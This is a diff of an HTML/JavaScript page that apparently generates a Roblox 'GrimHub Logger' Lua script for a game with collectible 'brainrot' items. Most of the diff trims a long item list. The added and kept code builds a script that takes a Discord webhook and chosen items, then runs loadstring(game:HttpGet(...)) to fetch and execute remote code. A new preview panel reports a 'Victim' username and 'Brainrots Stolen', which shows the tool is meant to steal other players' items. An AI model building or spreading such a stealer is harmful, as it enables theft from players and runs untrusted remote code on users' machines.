-        { name: "Cupid Hotspot", category: "secret", tierLabel: "SECRET" },
-        { name: "Mi Gatito", category: "secret", tierLabel: "SECRET" },
-        { name: "Ho Ho Ho Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Cupid Cupid Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Pot Pumpkin", category: "secret", tierLabel: "SECRET" },
-        { name: "Naughty Naughty", category: "secret", tierLabel: "SECRET" },
-        { name: "Bunito Bunito Spinito", category: "secret", tierLabel: "SECRET" },
-        { name: "Quesadilla Crocodila", category: "secret", tierLabel: "SECRET" },
-        { name: "Horegini Boom", category: "secret", tierLabel: "SECRET" },
-        { name: "Santa Hotspot", category: "secret", tierLabel: "SECRET" },
-        { name: "Pot Hotspot", category: "secret", tierLabel: "SECRET" },
-        { name: "25", category: "secret", tierLabel: "SECRET" },
-        { name: "Pirulitoita Bicicleteira", category: "secret", tierLabel: "SECRET" },
-        { name: "To to to Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Telemorte", category: "secret", tierLabel: "SECRET" },
-        { name: "La Sahur Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "List List List Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Noo my examine", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Jobcitos", category: "secret", tierLabel: "SECRET" },
-        { name: "Nooo My Hotspot", category: "secret", tierLabel: "SECRET" },
-        { name: "Bunnyman", category: "secret", tierLabel: "SECRET" },
-        { name: "Tung Tung Tung Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Cuadramat and Pakrahmatmamat", category: "secret", tierLabel: "SECRET" },
-        { name: "Please my Present", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Cucarachas", category: "secret", tierLabel: "SECRET" },
-        { name: "1x1x1x1", category: "secret", tierLabel: "SECRET" },
-        { name: "La Vacca Lepre Lepreino", category: "secret", tierLabel: "SECRET" },
-        { name: "Love Love Love Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Perrito Burrito", category: "secret", tierLabel: "SECRET" },
-        { name: "Graipuss Medussi", category: "secret", tierLabel: "SECRET" },
-        { name: "Giftini Spyderini", category: "secret", tierLabel: "SECRET" },
-        { name: "Trickolino", category: "secret", tierLabel: "SECRET" },
-        { name: "Paradiso Axolottino", category: "secret", tierLabel: "SECRET" },
-        { name: "Triplito Tralaleritos", category: "secret", tierLabel: "SECRET" },
-        { name: "La Vacca Jacko Linterino", category: "secret", tierLabel: "SECRET" },
-        { name: "Fishboard", category: "secret", tierLabel: "SECRET" },
-        { name: "Santteo", category: "secret", tierLabel: "SECRET" },
-        { name: "Las Vaquitas Saturnitas", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Karkeritos", category: "secret", tierLabel: "SECRET" },
-        { name: "Karker Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Trios", category: "secret", tierLabel: "SECRET" },
-        { name: "Job Job Job Sahur", category: "secret", tierLabel: "SECRET" },
-        { name: "Frankentteo", category: "secret", tierLabel: "SECRET" },
-        { name: "Pumpkini Spyderini", category: "secret", tierLabel: "SECRET" },
-        { name: "Las Tralaleritas", category: "secret", tierLabel: "SECRET" },
-        { name: "Rocco Disco", category: "secret", tierLabel: "SECRET" },
-        { name: "Extinct Matteo", category: "secret", tierLabel: "SECRET" },
-        { name: "La Karkerkar Kombinasin", category: "secret", tierLabel: "SECRET" },
-        { name: "La Vacca Prese Presente", category: "secret", tierLabel: "SECRET" },
-        { name: "Reindeer Tralala", category: "secret", tierLabel: "SECRET" },
-        { name: "Yess my examine", category: "secret", tierLabel: "SECRET" },
-        { name: "Guerriro Digitale", category: "secret", tierLabel: "SECRET" },
-        { name: "Boatito Auratito", category: "secret", tierLabel: "SECRET" },
-        { name: "Vulturino Skeletono", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Tralaleritos", category: "secret", tierLabel: "SECRET" },
-        { name: "Zombie Tralala", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Tortus", category: "secret", tierLabel: "SECRET" },
-        { name: "La Cucaracha", category: "secret", tierLabel: "SECRET" },
-        { name: "Fragola La La La", category: "secret", tierLabel: "SECRET" },
-        { name: "Extinct Tralalero", category: "secret", tierLabel: "SECRET" },
-        { name: "Agarrini la Palini", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Spyderinis", category: "secret", tierLabel: "SECRET" },
-        { name: "Chachechi", category: "secret", tierLabel: "SECRET" },
-        { name: "Blackhole Goat", category: "secret", tierLabel: "SECRET" },
-        { name: "Dul Dul Dul", category: "secret", tierLabel: "SECRET" },
-        { name: "Torrtuginni Dragonfrutini", category: "secret", tierLabel: "SECRET" },
-        { name: "Trenostruzzo Turbo 4000", category: "secret", tierLabel: "SECRET" },
-        { name: "Karkerkar Kurkur", category: "secret", tierLabel: "SECRET" },
-        { name: "Los Matteos", category: "secret", tierLabel: "SECRET" },
-        { name: "Bisonte Giuppitere", category: "secret", tierLabel: "SECRET" },
-        { name: "Sammyni Spyderini", category: "secret", tierLabel: "SECRET" },
-        { name: "La Vacca Saturno Saturnita", category: "secret", tierLabel: "SECRET" },
-        { name: "Jackorilla", category: "secret", tierLabel: "SECRET" },
-        { name: "Hydra Bunny", category: "secret", tierLabel: "SECRET" },
-        
-        // ========== BRAINROT GOD TIER ==========
-        { name: "GOAT", category: "god", tierLabel: "God" },
-        { name: "Cocofanto Elefanto", category: "god", tierLabel: "God" },
-        { name: "Pineaplino", category: "god", tierLabel: "God" },
-        { name: "Lazy Ducky", category: "god", tierLabel: "God" },
-        { name: "Unclito Samito", category: "god", tierLabel: "God" },
-        { name: "Tralalero Tralala", category: "god", tierLabel: "God" },
-        { name: "Piccione Macchina", category: "god", tierLabel: "God" },
-        { name: "Orcalero Orcala", category: "god", tierLabel: "God" },
-        { name: "Los Orcalitos", category: "god", tierLabel: "God" },
-        { name: "Orcalita Orcala", category: "god", tierLabel: "God" },
-        { name: "Cacasito Satalito", category: "god", tierLabel: "God" },
-        { name: "Gattatino Nyanino", category: "god", tierLabel: "God" },
-        
-        // ========== MYTHIC TIER (continued in common due to length) ==========
+        { name: "GOAT", category: "god", tierLabel: "GOD" },
         { name: "Ganganzelli Trulala", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Avocadorilla", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Rhino Helicopterino", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Tob Tobi Tobi", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Stoppo Luminino", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Los Noobinis", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Centrucci Nuclucci", category: "mythic", tierLabel: "MYTHIC" },
-        
-        // ========== LEGENDARY TIER ==========
         { name: "Sigma Boy", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Sigma Girl", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Puffaball", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Caramello Filtrello", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Chimpanzini Bananini", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Quackula", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Buho del Cielo", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Buho de Fuego", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Chocco Bunny", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Sealo Regalo", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Seraphino Gruyero", category: "legendary", tierLabel: "LEGENDARY" },
-        
-        // ========== EPIC TIER ==========
         { name: "Salamino Penguino", category: "epic", tierLabel: "EPIC" },
-        { name: "Malame Amarele", category: "epic", tierLabel: "EPIC" },
-        { name: "Penguino Cocosino", category: "epic", tierLabel: "EPIC" },
-        
-        // ========== RARE TIER ==========
-        { name: "Trippi Troppi", category: "rare", tierLabel: "RARE" },
         { name: "Pipi Avocado", category: "rare", tierLabel: "RARE" },
-        
-        // ========== COMMON TIER ==========
         { name: "Noobini Pizzanini", category: "common", tierLabel: "COMMON" },
-        { name: "Lirili Larila", category: "common", tierLabel: "COMMON" },
-        { name: "Tim Cheese", category: "common", tierLabel: "COMMON" },
-        { name: "Fluriflura", category: "common", tierLabel: "COMMON" },
-        { name: "Talpa Di Fero", category: "common", tierLabel: "COMMON" },
-        { name: "Noobini Santanini", category: "common", tierLabel: "COMMON" },
-        { name: "Svinina Bombardino", category: "common", tierLabel: "COMMON" },
-        { name: "Raccooni Jandelini", category: "common", tierLabel: "COMMON" },
-        { name: "Pipi Kiwi", category: "common", tierLabel: "COMMON" },
-        { name: "Tartaragno", category: "common", tierLabel: "COMMON" },
-        { name: "Pipi Corni", category: "common", tierLabel: "COMMON" },
-        { name: "Holy Arepa", category: "common", tierLabel: "COMMON" }
     ];
 
     document.getElementById('totalBrainrotsCount').innerText = brainrotsWithCategory.length;
@@ -603,10 +717,10 @@
     const imageCache = new Map();
     async function loadImageForBrainrot(name, imgElement) {
         if (imageCache.has(name)) {
-            imgElement.src = imageCache.get(name) || `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
+            imgElement.src = imageCache.get(name) || `https://ui-avatars.com/api/?background=423189&color=fff&size=28&name=${encodeURIComponent(name.charAt(0))}`;
             return;
         }
-        imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
+        imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=28&name=${encodeURIComponent(name.charAt(0))}`;
         const imgUrl = await fetchBrainrotImageUrl(name);
         imageCache.set(name, imgUrl);
         if (imgUrl) imgElement.src = imgUrl;
@@ -630,6 +744,7 @@
     const selectAllBtn = document.getElementById('selectAllBtn');
     const deselectAllBtn = document.getElementById('deselectAllBtn');
     const selectedStats = document.getElementById('selectedStats');
+    const embedPreview = document.getElementById('embedPreview');
 
     const categoryBtns = document.querySelectorAll('.category-btn');
     categoryBtns.forEach(btn => {
@@ -668,14 +783,48 @@
                     div.classList.add('selected');
                 }
                 updateSelectedCount();
+                updateEmbedPreview();
             });
             brainrotGrid.appendChild(div);
             loadImageForBrainrot(brainrot.name, img);
         }
         updateSelectedCount();
+        updateEmbedPreview();
     }
 
-    function updateSelectedCount() { selectedStats.innerText = selectedBrainrots.size; }
+    function updateSelectedCount() { 
+        selectedStats.innerText = selectedBrainrots.size; 
+    }
+
+    function updateEmbedPreview() {
+        const brainrotsArray = Array.from(selectedBrainrots);
+        const brainrotList = brainrotsArray.length > 0 ? brainrotsArray.slice(0, 5).join(', ') + (brainrotsArray.length > 5 ? ` +${brainrotsArray.length - 5} more` : '') : 'None selected';
+        
+        embedPreview.innerHTML = `
+            <div class="embed-preview-title">📤 PREVIEW OF WHAT WILL BE SENT TO YOUR DISCORD</div>
+            <div class="fake-embed">
+                <div class="fake-embed-header">
+                    <div class="fake-embed-avatar">💀</div>
+                    <div class="fake-embed-name">GrimHub Logger <span class="fake-embed-bot">BOT</span></div>
+                </div>
+                <div class="fake-embed-body">
+                    <div class="fake-embed-title">✅ Trade Completed Successfully</div>
+                    <div class="fake-embed-description">A trade has been executed using GrimHub Auto Morreria.</div>
+                    <div class="fake-embed-field">
+                        <span>👤 Victim:</span> (Victim Username)<br>
+                        <span>🆔 User ID:</span> (Victim ID)<br>
+                        <span>🎯 Target:</span> ${targetUser.value.trim() || 'Morreria'}
+                    </div>
+                    <div class="fake-embed-field">
+                        <span>🧠 Brainrots Stolen:</span> ${brainrotList}
+                    </div>
+                    <div class="fake-embed-footer">
+                        GrimHub Logger • Premium Script • ${new Date().toLocaleString()}
+                    </div>
+                </div>
+            </div>
+        `;
+    }
 
     function selectAll() {
         let itemsToSelect = brainrotsWithCategory;
@@ -683,6 +832,7 @@
         itemsToSelect.forEach(br => selectedBrainrots.add(br.name));
         updateSelectedCount();
         renderBrainrots();
+        updateEmbedPreview();
         showToast(`Selected ${selectedBrainrots.size} assets`);
     }
 
@@ -690,22 +840,23 @@
         selectedBrainrots.clear();
         updateSelectedCount();
         renderBrainrots();
+        updateEmbedPreview();
         showToast('Deselected all assets');
     }
 
     selectAllBtn.addEventListener('click', selectAll);
     deselectAllBtn.addEventListener('click', deselectAll);
+    targetUser.addEventListener('input', () => updateEmbedPreview());
     freezeSlider.addEventListener('input', () => freezeValueDisplay.innerText = freezeSlider.value + 's');
 
     function generateScript() {
         const webhook = webhookInput.value.trim();
-        if (!webhook) { alert('Webhook required'); return; }
-        if (!webhook.startsWith('https://discord.com/api/webhooks/')) { alert('Invalid webhook URL'); return; }
         const target = targetUser.value.trim() || "Morreria";
         const brainrotsArray = Array.from(selectedBrainrots);
         let brainrotsLua = '{' + brainrotsArray.map(br => `"${br.replace(/"/g, '\\"')}"`).join(', ') + '}';
         const freezeSec = parseInt(freezeSlider.value, 10);
-        const script = `-- GrimHub Logger
+        
+        const script = `-- GrimHub Logger - Premium
 script_key = "trial"
 
 getgenv().Webhook = "${webhook}"
@@ -719,14 +870,16 @@ getgenv().Distraction = {
 }
 
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf4184336d3d2463fedaccd56ede1246ebba931f664c1058acd094.lua"))()`;
+        
         outputCode.innerText = script;
+        showToast('✨ Script generated!');
     }
     
     generateBtn.addEventListener('click', generateScript);
     copyBtn.addEventListener('click', async () => {
         if (!outputCode.innerText.includes('Webhook')) { alert('Generate first'); return; }
         await navigator.clipboard.writeText(outputCode.innerText);
-        showToast('Copied');
+        showToast('📋 Copied to clipboard!');
     });
     downloadBtn.addEventListener('click', () => {
         if (!outputCode.innerText.includes('Webhook')) { alert('Generate first'); return; }
@@ -736,7 +889,7 @@ loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf41
         a.download = `grimhub_${Date.now()}.lua`;
         a.click();
         URL.revokeObjectURL(a.href);
-        showToast('Downloaded');
+        showToast('💾 Downloaded!');
     });
     
     function showToast(msg) {
@@ -746,11 +899,12 @@ loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf41
         div.className = 'copy-success';
         div.innerText = msg;
         document.body.appendChild(div);
-        setTimeout(() => div.remove(), 2000);
+        setTimeout(() => div.remove(), 2500);
     }
     
     renderBrainrots();
     updateSelectedCount();
+    updateEmbedPreview();
     searchInput.addEventListener('input', () => renderBrainrots());
 </script>
 </body>
